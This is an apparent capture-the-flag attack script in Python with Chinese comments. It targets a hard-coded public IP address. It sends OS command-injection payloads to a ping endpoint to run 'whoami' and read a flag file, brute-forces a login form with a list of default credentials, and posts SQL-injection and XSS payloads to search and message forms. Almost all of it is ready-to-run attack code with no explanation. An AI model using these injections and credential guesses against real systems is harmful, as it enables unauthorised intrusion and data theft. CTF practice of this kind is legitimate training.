import requests
import re

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

# 新建一个干净的session，不带任何代理配置
session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def test_ping_commands():
    """测试Ping命令执行"""
    print_section("1. 测试Ping命令执行")
    
    ping_url = f"{TARGET}/ping"
    
    ping_payloads = [
        "127.0.0.1",
        "127.0.0.1 & whoami",
        "127.0.0.1 & type F:\\flag.txt",
        "127.0.0.1 && whoami",
        "127.0.0.1 && type F:\\flag.txt",
        "127.0.0.1 | whoami",
        "127.0.0.1 | type F:\\flag.txt",
        "127.0.0.1; whoami",
        "127.0.0.1; type F:\\flag.txt",
        "127.0.0.1; cmd /c whoami",
        "127.0.0.1; cmd /c type F:\\flag.txt",
        "127.0.0.1; python -c \"print(open('F:\\flag.txt').read())\"",
        "& whoami",
        "& type F:\\flag.txt",
        "&& whoami",
        "&& type F:\\flag.txt",
        "| whoami",
        "| type F:\\flag.txt",
        ";whoami",
        ";type F:\\flag.txt",
    ]
    
    for payload in ping_payloads:
        try:
            r = session.get(ping_url, params={"host": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if len(body_content) > 50:
                        print(f"\n  [{r.status_code}] ?host={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            print(f"  错误: {e}")


def test_login():
    """测试登录"""
    print_section("2. 测试登录")
    
    url = f"{TARGET}/login"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    credentials = [
        ("admin", "admin"),
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", "ctf"),
        ("admin", "term3lab"),
        ("admin", "flag"),
        ("admin", "python"),
        ("admin", "lab"),
        ("admin", "term3"),
        ("root", "root"),
        ("root", "password"),
        ("root", "123456"),
        ("user", "user"),
        ("user", "password"),
        ("test", "test"),
        ("demo", "demo"),
        ("guest", "guest"),
        ("lab", "lab"),
        ("term3", "term3"),
    ]
    
    for username, password in credentials:
        try:
            data = {"username": username, "password": password, "csrf": csrf_token}
            r = session.post(url, data=data, timeout=TIMEOUT)
            
            if r.status_code == 200:
                if "用户名或密码错误" not in r.text:
                    print(f"\n  🎉 登录成功: {username}/{password}")
                    print(f"     内容: {r.text[:800]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
                    if flag_match:
                        print(f"     🚩 FLAG FOUND: {flag_match.group(0)}")
                        return
                    
                    # 检查是否有重定向
                    if r.history:
                        print(f"     重定向到: {r.url}")
                        r2 = session.get(r.url, timeout=TIMEOUT)
                        print(f"     内容: {r2.text[:500]}")
                        
                        flag_match2 = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
                        if flag_match2:
                            print(f"     🚩 FLAG FOUND: {flag_match2.group(0)}")
                            return
                    return
                    
        except Exception as e:
            print(f"  错误: {e}")
    
    print("\n  ❌ 未找到有效凭据")


def test_dashboard():
    """测试控制台"""
    print_section("3. 测试控制台")
    
    url = f"{TARGET}/dashboard"
    
    r = session.get(url, timeout=TIMEOUT)
    
    print(f"\n  [{r.status_code}] {url}")
    print(f"     内容: {r.text[:800]}")
    
    flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
    if flag_match:
        print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")


def test_search():
    """测试搜索功能"""
    print_section("4. 测试搜索功能")
    
    url = f"{TARGET}/search"
    
    search_payloads = [
        "flag",
        "FLAG",
        "secret",
        "admin",
        "password",
        "database",
        "config",
        "sql",
        "union",
        "select",
        "from",
        "where",
        "or",
        "and",
        "1=1",
        "'",
        "\"",
        "\\",
        "%",
        "*",
        "?",
    ]
    
    for payload in search_payloads:
        try:
            r = session.get(url, params={"q": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<div class="results">(.*?)</div>', r.text, re.DOTALL)
                if body_match:
                    results_content = body_match.group(1)
                    
                    if len(results_content) > 50:
                        print(f"\n  [{r.status_code}] ?q={payload}")
                        print(f"     结果: {results_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', results_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            print(f"  错误: {e}")


def test_message():
    """测试消息功能"""
    print_section("5. 测试消息功能")
    
    url = f"{TARGET}/message"
    
    r = session.get(url, timeout=TIMEOUT)
    
    print(f"\n  [{r.status_code}] {url}")
    print(f"     内容: {r.text[:800]}")
    
    flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
    if flag_match:
        print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
    
    # 测试提交消息
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    messages = [
        {"author": "test", "content": "test message"},
        {"author": "test", "content": "<script>alert('xss')</script>"},
        {"author": "test", "content": "<img src=x onerror=alert(1)>"},
        {"author": "test", "content": "' OR 1=1--"},
        {"author": "test", "content": "flag"},
        {"author": "test", "content": "FLAG"},
    ]
    
    for msg in messages:
        try:
            data = {"author": msg["author"], "content": msg["content"], "csrf": csrf_token}
            r = session.post(url, data=data, timeout=TIMEOUT)
            
            if r.status_code == 200:
                print(f"\n  提交消息: {msg['content']}")
                print(f"     响应: {r.text[:500]}")
                
                flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
                if flag_match:
                    print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                    return
                    
        except Exception as e:
            print(f"  错误: {e}")


def main():
    print("*" * 70)
    print("  CTF漏洞测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    test_ping_commands()
    test_login()
    test_dashboard()
    test_search()
    test_message()
    
    print_section("测试完成")


if __name__ == "__main__":
    main()